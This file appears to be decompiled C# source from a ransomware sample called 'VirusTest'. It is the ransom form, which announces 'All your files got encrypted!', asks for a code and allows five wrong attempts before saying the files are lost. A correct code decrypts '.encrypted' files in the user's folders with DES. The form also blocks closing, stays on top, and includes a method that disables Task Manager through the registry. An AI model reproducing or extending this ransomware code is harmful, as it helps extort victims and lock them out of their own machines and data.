using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using VirusTest.Properties;

namespace VirusTest;

public class Form2 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Button button1;

	private TextBox textBox1;

	public Form2()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		//IL_029d: Unknown result type (might be due to invalid IL or missing references)
		//IL_032a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0356: Unknown result type (might be due to invalid IL or missing references)
		if (string.IsNullOrEmpty(((Control)textBox1).get_Text()) || string.IsNullOrWhiteSpace(((Control)textBox1).get_Text()))
		{
			return;
		}
		if (Settings.Default.COUNT == 5)
		{
			MessageBox.Show("YOU HAVE NO CHANCHE TO GET YOUR FILES BACK!");
			return;
		}
		if (((Control)textBox1).get_Text().Equals(Settings.Default.PW))
		{
			MessageBox.Show("Please wait while we decrypt your files...\nWe will notify you when its done.");
			List<string> list = new List<string>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			foreach (string item in DirSearch(folderPath))
			{
				try
				{
					Decrypt(item, Settings.Default.PW);
					list.Add(item);
				}
				catch
				{
				}
			}
			folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
			foreach (string item2 in DirSearch(folderPath))
			{
				try
				{
					Decrypt(item2, Settings.Default.PW);
					list.Add(item2);
				}
				catch
				{
				}
			}
			folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			foreach (string item3 in DirSearch(folderPath))
			{
				try
				{
					Decrypt(item3, Settings.Default.PW);
					list.Add(item3);
				}
				catch
				{
				}
			}
			folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
			foreach (string item4 in DirSearch(folderPath))
			{
				try
				{
					Decrypt(item4, Settings.Default.PW);
					list.Add(item4);
				}
				catch
				{
				}
			}
			folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			foreach (string item5 in DirSearch(folderPath))
			{
				try
				{
					Decrypt(item5, Settings.Default.PW);
					list.Add(item5);
				}
				catch
				{
				}
			}
			foreach (string item6 in list)
			{
				try
				{
					File.Move(item6, item6.Substring(0, item6.Length - 10));
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
			MessageBox.Show("Done!");
			((ApplicationSettingsBase)Settings.Default).Reset();
			Settings.Default.PW = "__invalid__";
			Settings.Default.ALLOWED = true;
			Settings.Default.AS = false;
			Settings.Default.COUNT = 0;
			((SettingsBase)Settings.Default).Save();
			try
			{
				File.Delete("C:\\a.txt");
				return;
			}
			catch
			{
				return;
			}
		}
		Settings.Default.COUNT++;
		((SettingsBase)Settings.Default).Save();
		if (Settings.Default.COUNT == 5)
		{
			MessageBox.Show("YOU HAVE NO CHANCHE TO GET YOUR FILES BACK!");
		}
		else
		{
			MessageBox.Show("Allowed mistakes left: " + (5 - Settings.Default.COUNT) + "...");
		}
	}

	public static void Decrypt(string filePath, string key)
	{
		try
		{
			byte[] array = File.ReadAllBytes(filePath);
			using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.IV = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Key = Encoding.UTF8.GetBytes(key);
			dESCryptoServiceProvider.Mode = CipherMode.CBC;
			dESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			using MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			File.WriteAllBytes(filePath, memoryStream.ToArray());
		}
		catch
		{
		}
	}

	private List<string> DirSearch(string sDir)
	{
		List<string> list = new List<string>();
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (text.EndsWith(".encrypted"))
				{
					list.Add(text);
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				list.AddRange(DirSearch(sDir2));
			}
		}
		catch
		{
		}
		return list;
	}

	public void SetTaskManager(bool enable)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (enable && registryKey.GetValue("DisableTaskMgr") != null)
		{
			registryKey.DeleteValue("DisableTaskMgr");
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
		}
		registryKey.Close();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_02cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(59, 31));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(434, 39));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("All your files got encrypted!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(260, 125));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 16));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Code");
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(66, 170));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(427, 66));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("Check Code");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(66, 144));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(427, 20));
		((Control)textBox1).set_TabIndex(3);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(577, 248));
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
